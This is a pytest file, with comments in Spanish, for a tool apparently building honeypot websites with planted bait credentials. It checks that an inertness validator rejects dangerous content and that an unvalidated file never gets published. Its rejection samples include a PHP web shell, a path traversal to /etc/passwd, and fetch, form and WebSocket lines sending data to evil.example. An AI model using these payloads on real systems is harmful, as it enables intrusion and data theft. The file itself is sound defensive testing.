"""Worldsmith (Fase D): validador de inertness bulletproof, capa de herramientas, y build
end-to-end con el proveedor stub (sin coste). Verifica también que un fichero ejecutable
colado por fuera de las herramientas NO llega a publicarse."""

import os

import pytest

from moqesh.db import SessionLocal, init_db
from moqesh.scenarios import ScenarioContext, ScenarioEngine, ScenarioRequest, load_active
from moqesh.world import World
from moqesh.worldsmith.builder import build_world
from moqesh.worldsmith.providers import ApiProvider, ClaudeCliProvider, StubProvider, dispatch
from moqesh.worldsmith.tools import BuildSandbox
from moqesh.worldsmith.validate import (
    InertnessError,
    safe_relpath,
    validate_file,
    validate_manifest,
    validate_tree,
)

# --------------------------------------------------------------------- validate


def test_safe_relpath_accepts_and_rejects():
    assert safe_relpath("sites/a/index.html") == "sites/a/index.html"
    for bad in ("../etc/passwd", "/abs/x.html", "a\\b.html", "x.php", "a/" * 12 + "d.html", "\x00.html"):
        with pytest.raises(InertnessError):
            safe_relpath(bad)


def test_validate_file_accepts_inert_content():
    validate_file("i.html", b"<!doctype html><title>x</title><a href='https://ok.example'>ext link</a>")
    validate_file("a.css", b"body{color:#000;background:url('/local.png')}")
    validate_file("h.json", b'{"ts":"{{moqesh.now_iso}}","up":{{moqesh.uptime_seconds}}}')
    validate_file("f.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>')  # xmlns namespace, no carga
    validate_file("login.html", b"<form method=post action='/api/login'><input name=u></form>")  # same-origin


@pytest.mark.parametrize(
    "body",
    [
        b"<?php system($_GET['c']); ?>",
        b"<% Response.Write(1) %>",
        b"#!/bin/sh\necho hi",
        b"<div>{{ user.name }}</div>",  # plantilla desconocida (no moqesh.*)
        b"<script src='https://cdn.example/x.js'></script>",
        b"<link rel=stylesheet href='//fonts.example/c.css'>",
        b"<form action='https://evil.example/collect'><input></form>",
        b"<script>fetch('https://evil.example/exfil',{method:'POST'})</script>",
        b"<style>@import url('https://cdn.example/x.css')</style>",
        b"<script>new WebSocket('wss://evil.example/ws')</script>",
        b"<image xlink:href='https://evil.example/p.png'/>",
    ],
)
def test_validate_file_rejects_dangerous(body):
    with pytest.raises(InertnessError):
        validate_file("x.html", body)


def test_validate_file_size_limit():
    with pytest.raises(InertnessError):
        validate_file("big.txt", b"x" * (512 * 1024 + 1))


def test_validate_manifest():
    assert validate_manifest({"mounts": [{"prefix": "/", "dir": "sites/a"}]}, {"sites/a"}) == []
    assert validate_manifest({"mounts": []}, set())  # vacío -> problema
    assert validate_manifest({"mounts": [{"prefix": "/", "dir": "../esc"}]}, set())  # escapa
    assert validate_manifest({"mounts": [{"prefix": "/", "dir": "sites/missing"}]}, set())  # no existe


def test_validate_tree_flags_bad_file(tmp_path):
    root = str(tmp_path)
    os.makedirs(os.path.join(root, "sites/a"))
    with open(os.path.join(root, "sites/a/index.html"), "w") as f:
        f.write("<!doctype html><title>ok</title>")
    with open(os.path.join(root, "manifest.json"), "w") as f:
        f.write('{"mounts":[{"prefix":"/","dir":"sites/a"}]}')
    assert validate_tree(root) == []
    with open(os.path.join(root, "sites/a/evil.html"), "w") as f:
        f.write("<?php echo 1; ?>")
    problems = validate_tree(root)
    assert any("evil.html" in p for p in problems)


# --------------------------------------------------------------------- tools


def test_sandbox_write_and_reject(tmp_path):
    sb = BuildSandbox(root=str(tmp_path / "build"), seed_dir=str(tmp_path / "seed"))
    assert sb.write_file("sites/a/index.html", "<!doctype html><title>x</title>")["ok"]
    assert not sb.write_file("x.php", "<?php ?>")["ok"]  # extensión
    assert not sb.write_file("../escape.html", "x")["ok"]  # traversal
    bad = sb.write_file("sites/a/x.html", "<script src='https://cdn/x.js'></script>")
    assert not bad["ok"] and bad.get("reasons")


def test_plant_bait_single_credential_and_placeholder(tmp_path):
    sb = BuildSandbox(root=str(tmp_path / "b"), seed_dir=str(tmp_path / "s"))
    # sin el placeholder {{cred:KEY}} -> rechazo
    assert not sb.plant_bait("ops_token", ["/.env"], "NO_TOKEN_HERE", ["/ops"], "<h1>ops</h1>")["ok"]
    out = sb.plant_bait(
        "ops_token",
        ["/.env.bak", "/.env", "/env.bak"],
        "OPS_API_TOKEN={{cred:ops_token}}\nOPS_DASHBOARD_URL=/internal/ops\n",
        ["/internal/ops", "/ops"],
        "<!doctype html><title>Ops</title><h1>Ops Console</h1>",
        robots_disallow=["/internal/ops", "/ops/"],
    )
    assert out["ok"]
    assert len(sb.bait_pack["credentials"]) == 1 and sb.bait_pack["credentials"][0]["key"] == "ops_token"
    paths = {n["path"] for n in sb.bait_pack["nodes"]}
    assert {"/.env", "/env.bak", "/internal/ops", "/ops", "/robots.txt"} <= paths


def test_dispatch_unknown_tool_is_safe(tmp_path):
    sb = BuildSandbox(root=str(tmp_path / "b"), seed_dir=str(tmp_path / "s"))
    assert dispatch(sb, "nope", {})["ok"] is False
    assert dispatch(sb, "write_file", "not-a-dict")["ok"] is False


# --------------------------------------------------------------------- build e2e (stub)


def test_stub_build_publishes_valid_world_and_imports_bait(tmp_path):
    init_db()
    world_path = str(tmp_path / "world")
    report = build_world(provider=StubProvider(), world_path=world_path, brand="Testco", import_bait=True)
    assert report["ok"] and report["published"]
    # El World publicado valida y sirve bytes reales.
    assert validate_tree(world_path) == []
    w = World(world_path)
    assert w.active
    assert w.resolve("/") and b"Testco" in w.resolve("/").body
    assert w.resolve("/docs/") is not None
    assert w.resolve("/status/api/summary.json") is not None
    assert w.resolve("/nope-xyz-123") is None  # lo ausente -> 404
    # El cebo se importó como escenario activo y dispara credential_reuse al reusar el token.
    assert report["bait"]["ok"] and report["bait"]["active"]
    with SessionLocal() as db:
        data = load_active(db)
    ctx = ScenarioContext(seed="x", brand="Testco")
    eng = ScenarioEngine()
    env = eng.resolve(data, ctx, ScenarioRequest(path="/.env", headers={})).body.decode()
    token = next(line.split("=", 1)[1] for line in env.splitlines() if line.startswith("OPS_API_TOKEN="))
    ok = eng.resolve(data, ctx, ScenarioRequest(path="/ops", headers={"authorization": f"Bearer {token}"}))
    assert ok and ok.status == 200 and ok.used_planted_cred_key == "ops_token"


class _LeakyProvider:
    """Escribe un árbol válido vía herramientas y además cuela un .html ejecutable directo a disco
    (simula un proveedor CLI que no pasó por la validación por-escritura)."""

    def build(self, sandbox, system_prompt, brief):
        StubProvider().build(sandbox, system_prompt, brief)
        with open(os.path.join(sandbox.root, "sites/console/evil.html"), "w") as f:
            f.write("<?php system($_GET['c']); ?>")
        return {"ok": True, "provider": "leaky"}


def test_api_provider_tool_use_loop(tmp_path):
    """El bucle tool-use del ApiProvider ejecuta herramientas y realimenta resultados (sin red real)."""
    import httpx

    sb = BuildSandbox(root=str(tmp_path / "b"), seed_dir=str(tmp_path / "s"))
    turns = [
        {
            "content": [
                {
                    "type": "tool_use",
                    "id": "t1",
                    "name": "write_file",
                    "input": {
                        "path": "sites/c/index.html",
                        "content": "<!doctype html><title>Acme</title><h1>Acme</h1>",
                    },
                },
                {
                    "type": "tool_use",
                    "id": "t2",
                    "name": "set_manifest",
                    "input": {"mounts": [{"prefix": "/", "dir": "sites/c"}]},
                },
                {
                    "type": "tool_use",
                    "id": "t3",
                    "name": "plant_bait",
                    "input": {
                        "credential_key": "ops_token",
                        "leak_paths": ["/.env", "/.env.bak"],
                        "leak_body": "OPS_API_TOKEN={{cred:ops_token}}\nOPS_DASHBOARD_URL=/internal/ops\n",
                        "gate_paths": ["/internal/ops", "/ops"],
                        "gate_body": "<!doctype html><title>Ops</title><h1>Ops</h1>",
                        "robots_disallow": ["/internal/ops"],
                    },
                },
            ]
        },
        {
            "content": [
                {"type": "text", "text": "listo"},
                {"type": "tool_use", "id": "t4", "name": "finish", "input": {"summary": "ok"}},
            ]
        },
    ]
    seen = {"n": 0, "had_tools": False}

    def handler(request: "httpx.Request") -> "httpx.Response":
        assert request.url.path == "/v1/messages"
        assert request.headers.get("x-api-key") == "test"
        body = __import__("json").loads(request.content)
        seen["had_tools"] = bool(body.get("tools"))
        i = min(seen["n"], len(turns) - 1)
        seen["n"] += 1
        payload = {
            "id": "m", "type": "message", "role": "assistant", "model": "x",
            "stop_reason": "tool_use", "content": turns[i]["content"],
            "usage": {"input_tokens": 1, "output_tokens": 1},
        }
        return httpx.Response(200, json=payload)

    prov = ApiProvider(api_key="test", model="x", transport=httpx.MockTransport(handler))
    res = prov.build(sb, "sys", "brief")
    assert res["ok"] and sb.done and seen["had_tools"]
    assert "sites/c/index.html" in sb.files
    assert os.path.isfile(os.path.join(sb.root, "manifest.json"))
    assert sb.bait_pack and sb.bait_pack["credentials"][0]["key"] == "ops_token"


def test_claude_cli_ingest_bait_convention(tmp_path):
    """El provider CLI ingiere _worldsmith_bait.json por nuestro plant_bait validado y lo borra."""
    import json as _json

    root = tmp_path / "b"
    (root / "sites" / "c").mkdir(parents=True)
    (root / "sites" / "c" / "index.html").write_text("<!doctype html><title>x</title>")
    (root / "manifest.json").write_text('{"mounts":[{"prefix":"/","dir":"sites/c"}]}')
    (root / "_worldsmith_bait.json").write_text(
        _json.dumps(
            {
                "credential_key": "ops_token",
                "leak_paths": ["/.env", "/.env.bak"],
                "leak_body": "OPS_API_TOKEN={{cred:ops_token}}\nOPS_DASHBOARD_URL=/internal/ops\n",
                "gate_paths": ["/internal/ops", "/ops"],
                "gate_body": "<!doctype html><title>Ops</title><h1>Ops</h1>",
                "robots_disallow": ["/internal/ops"],
            }
        )
    )
    sb = BuildSandbox(root=str(root), seed_dir=str(tmp_path / "s"))
    res = ClaudeCliProvider().ingest(sb)
    assert res["ok"]
    assert sb.bait_pack and sb.bait_pack["credentials"][0]["key"] == "ops_token"
    assert not (root / "_worldsmith_bait.json").exists()  # artefacto borrado (no se publica)
    assert "sites/c/index.html" in sb.files
    assert "manifest.json" not in sb.files and "_worldsmith_bait.json" not in sb.files


def test_build_does_not_publish_when_final_validation_fails(tmp_path):
    world_path = str(tmp_path / "world")
    report = build_world(provider=_LeakyProvider(), world_path=world_path, brand="X", import_bait=False)
    assert report["ok"] is False and report["published"] is False
    assert any("evil.html" in p for p in report["problems"])
    assert not os.path.exists(os.path.join(world_path, "manifest.json"))  # World en vivo intacto
